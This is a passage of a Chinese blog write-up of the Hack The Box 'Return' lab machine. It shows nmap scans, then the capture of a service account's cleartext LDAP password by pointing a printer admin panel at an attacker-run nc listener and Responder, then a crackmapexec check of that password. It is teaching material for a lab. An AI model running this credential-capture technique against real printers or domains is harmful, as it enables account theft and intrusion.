@@ -1,0 +1,793 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：ldap、监听389端口、responder、用户特权组、Server Operators、sc.exe配置服务提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Return-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/05/08/Return-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：ldap、监听389端口、responder、用户特权组、Server Operators、sc.exe配置服务提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Return-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Return-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Return-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Return-htb-writeup/4.png">
+<meta property="article:published_time" content="2024-05-08T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-05-14T09:38:51.716Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Return-htb-writeup/1.png">
+  
+  
+  
+  <title>Return-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
+                    
+                    <span>简易反弹shell集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Return-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-08 23:50" pubdate>
+          2024年5月8日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          18k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          151 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Return-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：ldap、监听389端口、responder、用户特权组、Server Operators、sc.exe配置服务提权</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>无参考链接，根据靶机介绍直接拿下</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、靶机介绍</p>
+<p><code>Return 是一款简单难度的 Windows 机器，具有存储 LDAP 凭据的网络打印机管理面板。这些凭据可以通过输入恶意 LDAP 服务器来捕获，该服务器允许通过 WinRM 服务在服务器上获得立足点。发现用户属于特权组的一部分，该特权组被进一步利用以获得系统访问权限。</code></p>
+<p>2、获取下靶机IP地址：10.10.11.108</p>
+<p>3、获取下开放端口情况：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate=<span class="hljs-number">10000</span> -oG allports <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.108</span><br>[sudo] kali 的密码：<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-05-08 23:57 CST</span><br>Warning: <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.108</span> giving up on port because retransmission cap hit (<span class="hljs-number">10</span>).<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.108</span><br>Host is up (<span class="hljs-number">0.12</span>s latency).<br>Not shown: <span class="hljs-number">64998</span> closed tcp ports (reset), <span class="hljs-number">511</span> filtered tcp ports (no-response)<br>PORT      STATE SERVICE<br><span class="hljs-number">53</span>/tcp    open  domain<br><span class="hljs-number">80</span>/tcp    open  http<br><span class="hljs-number">88</span>/tcp    open  kerberos-sec<br><span class="hljs-number">135</span>/tcp   open  msrpc<br><span class="hljs-number">139</span>/tcp   open  netbios-ssn<br><span class="hljs-number">389</span>/tcp   open  ldap<br><span class="hljs-number">445</span>/tcp   open  microsoft-ds<br><span class="hljs-number">464</span>/tcp   open  kpasswd5<br><span class="hljs-number">593</span>/tcp   open  http-rpc-epmap<br><span class="hljs-number">636</span>/tcp   open  ldapssl<br><span class="hljs-number">3268</span>/tcp  open  globalcatLDAP<br><span class="hljs-number">3269</span>/tcp  open  globalcatLDAPssl<br><span class="hljs-number">5985</span>/tcp  open  wsman<br><span class="hljs-number">9389</span>/tcp  open  adws<br><span class="hljs-number">47001</span>/tcp open  winrm<br><span class="hljs-number">49664</span>/tcp open  unknown<br><span class="hljs-number">49665</span>/tcp open  unknown<br><span class="hljs-number">49666</span>/tcp open  unknown<br><span class="hljs-number">49668</span>/tcp open  unknown<br><span class="hljs-number">49671</span>/tcp open  unknown<br><span class="hljs-number">49676</span>/tcp open  unknown<br><span class="hljs-number">49677</span>/tcp open  unknown<br><span class="hljs-number">49678</span>/tcp open  unknown<br><span class="hljs-number">49681</span>/tcp open  unknown<br><span class="hljs-number">49738</span>/tcp open  unknown<br><span class="hljs-number">64965</span>/tcp open  unknown<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">22.62</span> seconds<br>                                                                              <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ grep -oP <span class="hljs-string">&#x27;([0-9]+)/open&#x27;</span> allports | awk -F/ <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | tr <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-string">&#x27;,&#x27;</span><br><span class="hljs-number">53</span>,<span class="hljs-number">80</span>,<span class="hljs-number">88</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">389</span>,<span class="hljs-number">445</span>,<span class="hljs-number">464</span>,<span class="hljs-number">593</span>,<span class="hljs-number">636</span>,<span class="hljs-number">3268</span>,<span class="hljs-number">3269</span>,<span class="hljs-number">5985</span>,<span class="hljs-number">9389</span>,<span class="hljs-number">47001</span>,<span class="hljs-number">49664</span>,<span class="hljs-number">49665</span>,<span class="hljs-number">49666</span>,<span class="hljs-number">49668</span>,<span class="hljs-number">49671</span>,<span class="hljs-number">49676</span>,<span class="hljs-number">49677</span>,<span class="hljs-number">49678</span>,<span class="hljs-number">49681</span>,<span class="hljs-number">49738</span>,<span class="hljs-number">64965</span>,                       <br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.108</span> --min-rate=<span class="hljs-number">10000</span> -p53,<span class="hljs-number">80</span>,<span class="hljs-number">88</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">389</span>,<span class="hljs-number">445</span>,<span class="hljs-number">464</span>,<span class="hljs-number">593</span>,<span class="hljs-number">636</span>,<span class="hljs-number">3268</span>,<span class="hljs-number">3269</span>,<span class="hljs-number">5985</span>,<span class="hljs-number">9389</span>,<span class="hljs-number">47001</span>,<span class="hljs-number">49664</span>,<span class="hljs-number">49665</span>,<span class="hljs-number">49666</span>,<span class="hljs-number">49668</span>,<span class="hljs-number">49671</span>,<span class="hljs-number">49676</span>,<span class="hljs-number">49677</span>,<span class="hljs-number">49678</span>,<span class="hljs-number">49681</span>,<span class="hljs-number">49738</span>,<span class="hljs-number">64965</span> -sC -sV -T4<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-05-08 23:59 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.108</span><br>Host is up (<span class="hljs-number">0.15</span>s latency).<br><br>PORT      STATE SERVICE       VERSION<br><span class="hljs-number">53</span>/tcp    open  domain        Simple DNS Plus<br><span class="hljs-number">80</span>/tcp    open  http          Microsoft IIS httpd <span class="hljs-number">10.0</span><br>|_http-server-header: Microsoft-IIS/<span class="hljs-number">10.0</span><br>|_http-title: HTB Printer Admin Panel<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br><span class="hljs-number">88</span>/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: <span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-08</span> <span class="hljs-number">08</span>:<span class="hljs-number">14</span>:<span class="hljs-number">13</span>Z)<br><span class="hljs-number">135</span>/tcp   open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br><span class="hljs-number">389</span>/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: <span class="hljs-keyword">return</span>.local0., Site: Default-First-Site-Name)<br><span class="hljs-number">445</span>/tcp   open  microsoft-ds?<br><span class="hljs-number">464</span>/tcp   open  kpasswd5?<br><span class="hljs-number">593</span>/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP <span class="hljs-number">1.0</span><br><span class="hljs-number">636</span>/tcp   open  tcpwrapped<br><span class="hljs-number">3268</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: <span class="hljs-keyword">return</span>.local0., Site: Default-First-Site-Name)<br><span class="hljs-number">3269</span>/tcp  open  tcpwrapped<br><span class="hljs-number">5985</span>/tcp  open  http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/<span class="hljs-number">2.0</span><br>|_http-title: Not Found<br><span class="hljs-number">9389</span>/tcp  open  mc-nmf        .NET Message Framing<br><span class="hljs-number">47001</span>/tcp open  http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/<span class="hljs-number">2.0</span><br>|_http-title: Not Found<br><span class="hljs-number">49664</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49665</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49666</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49668</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49671</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49676</span>/tcp open  ncacn_http    Microsoft Windows RPC over HTTP <span class="hljs-number">1.0</span><br><span class="hljs-number">49677</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49678</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49681</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49738</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">64965</span>/tcp open  msrpc         Microsoft Windows RPC<br>Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-security-mode: <br>|   <span class="hljs-number">3</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>: <br>|_    Message signing enabled and required<br>| smb2-time: <br>|   date: <span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-08</span>T08:<span class="hljs-number">15</span>:<span class="hljs-number">11</span><br>|_  start_date: N/A<br>|_clock-skew: <span class="hljs-number">-7</span>h45m42s<br><br>Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">71.56</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>4、先把上述探测到的域名地址本地绑定下hosts</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ echo <span class="hljs-string">&quot;10.10.11.108 printer.return.local return.local&quot;</span> | sudo tee -a /etc/hosts<br>[sudo] kali 的密码：<br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.108</span> printer.<span class="hljs-keyword">return</span>.local <span class="hljs-keyword">return</span>.local<br></code></pre></td></tr></table></figure>
+
+<p>5、先观察下80端口的WEB服务信息吧</p>
+<p><code>http://10.10.11.108/index.php</code></p>
+<p><img src="http://sh1yan.top/photo/Return-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>http://10.10.11.108/settings.php</code></p>
+<p><img src="http://sh1yan.top/photo/Return-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">printer.<span class="hljs-keyword">return</span>.local<br><br><span class="hljs-number">389</span><br><br>svc-printer<br><br>*******<br></code></pre></td></tr></table></figure>
+
+<p>6、经过摸索，尝试通过nc去监听，让网页服务区连接我们的IP地址</p>
+<p><img src="http://sh1yan.top/photo/Return-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lvnp <span class="hljs-number">389</span><br>listening on [any] <span class="hljs-number">389</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.11</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.108</span>] <span class="hljs-number">61852</span><br><span class="hljs-number">0</span>*`%<span class="hljs-keyword">return</span>\svc-printer�<br>                       <span class="hljs-number">1</span>edFg43012!!<br></code></pre></td></tr></table></figure>
+
+<p>7、这里获取到账号密码信息，下面尝试验证下是否可以正常登录</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ crackmapexec smb <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.108</span> -u <span class="hljs-string">&#x27;svc-printer&#x27;</span> -p <span class="hljs-string">&#x27;1edFg43012!!&#x27;</span><br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.108</span>    <span class="hljs-number">445</span>    PRINTER          [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> x64 (name:PRINTER) (domain:<span class="hljs-keyword">return</span>.local) (signing:True) (SMBv1:False)<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.108</span>    <span class="hljs-number">445</span>    PRINTER          [+] <span class="hljs-keyword">return</span>.local\svc-printer:<span class="hljs-number">1</span>edFg43012!! <br></code></pre></td></tr></table></figure>
+
+<p>8、这里发现密码是可以使用的，这次补充一下上面那个ldap密码明文的抓取步骤，这里使用responder工具进行监听抓取</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo responder -I tun0      <br>[sudo] kali 的密码：<br>                                         __<br>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.<br>  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|<br>  |__| |_____|_____|   __|_____|__|__|_____||_____|__|<br>                   |__|<br><br>           NBT-NS, LLMNR &amp; MDNS Responder <span class="hljs-number">3.1</span><span class="hljs-number">.4</span><span class="hljs-number">.0</span><br><br>  To support this project:<br>  Github -&gt; https:<span class="hljs-comment">//github.com/sponsors/lgandx</span><br>  Paypal  -&gt; https:<span class="hljs-comment">//paypal.me/PythonResponder</span><br><br>  Author: Laurent <span class="hljs-title function_">Gaffie</span> <span class="hljs-params">(laurent.gaffie@gmail.com)</span><br>  To kill this script hit CTRL-C<br><br><br>[+] Poisoners:<br>    LLMNR                      [ON]<br>    NBT-NS                     [ON]<br>    MDNS                       [ON]<br>    DNS                        [ON]<br>    DHCP                       [OFF]<br><br>[+] Servers:<br>    HTTP server                [ON]<br>    HTTPS server               [ON]<br>    WPAD proxy                 [OFF]<br>    Auth proxy                 [OFF]<br>    SMB server                 [ON]<br>    Kerberos server            [ON]<br>    SQL server                 [ON]<br>    FTP server                 [ON]<br>    IMAP server                [ON]<br>    POP3 server                [ON]<br>    SMTP server                [ON]<br>    DNS server                 [ON]<br>    LDAP server                [ON]<br>    MQTT server                [ON]<br>    RDP server                 [ON]<br>    DCE-RPC server             [ON]<br>    WinRM server               [ON]<br>    SNMP server                [OFF]<br><br>[+] HTTP Options:<br>    Always serving EXE         [OFF]<br>    Serving EXE                [OFF]<br>    Serving HTML               [OFF]<br>    Upstream Proxy             [OFF]<br><br>[+] Poisoning Options:<br>    Analyze Mode               [OFF]<br>    Force WPAD auth            [OFF]<br>    Force Basic Auth           [OFF]<br>    Force LM downgrade         [OFF]<br>    Force ESS downgrade        [OFF]<br><br>[+] Generic Options:<br>    Responder NIC              [tun0]<br>    Responder IP               [10.10.14.11]<br>    Responder IPv6             [dead:beef:2::1009]<br>    Challenge <span class="hljs-built_in">set</span>              [random]<br>    Don&#x27;t Respond To Names     [&#x27;ISATAP&#x27;, &#x27;ISATAP.LOCAL&#x27;]<br><br>[+] Current Session Variables:<br>    Responder Machine Name     [WIN-9UR2XUDZ85J]<br>    Responder Domain Name      [1GGZ.LOCAL]<br>    Responder DCE-RPC Port     [48986]<br><br>[+] Listening <span class="hljs-keyword">for</span> events...                                                                                                                                                             <br><br>[LDAP] Cleartext Client   : 10.10.11.108<br>[LDAP] Cleartext Username : <span class="hljs-keyword">return</span>\svc-printer<br>[LDAP] Cleartext Password : 1edFg43012!!<br></code></pre></td></tr></table></figure>
+
+<p>9、既然拿到账号密码了，就登录下靶机，获取第一个flag信息吧</p>
